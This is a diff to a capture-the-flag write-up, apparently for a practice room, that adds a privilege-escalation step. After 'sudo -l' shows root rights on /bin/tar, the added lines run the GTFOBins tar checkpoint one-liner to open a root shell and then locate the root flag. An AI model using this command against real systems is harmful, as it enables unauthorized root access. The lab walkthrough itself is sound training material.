@@ -83,15 +83,32 @@
      ```bash
      sudo -l
      ```
-   - Output:
-     ![Source: Sudo Permission](screenshots/sudoperm.png)
-  
-      
-
      
-   
+   - Output:
+     
+     ![Source: Sudo Permission](screenshots/sudoperm.png)
 
+   - User lin may run the following commands on ip-10-10-148-152:
+    (root) /bin/tar
+      
+  6. ### Search for binaries ###
 
+   - search for the Unix binaries in GTFO Bins for /bin/tar
+   - find and run the binary:
+     ```bash
+     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+     ```
+   - We got the root access to the victim machine.
+
+   7. ### Root Flag ###
+      - search for root flag in /root directory.
+      - `ls /root`
+      - found our root flag.
+      - read root flag.
+      - `ls /root/root.txt`
+        ![Root Flag Found](screenshots/root.png)
+
+      #### Finally found our root flag ####
 ---
 ## Credits ##
 - Shout-out to @Sevuhl for creating this room.
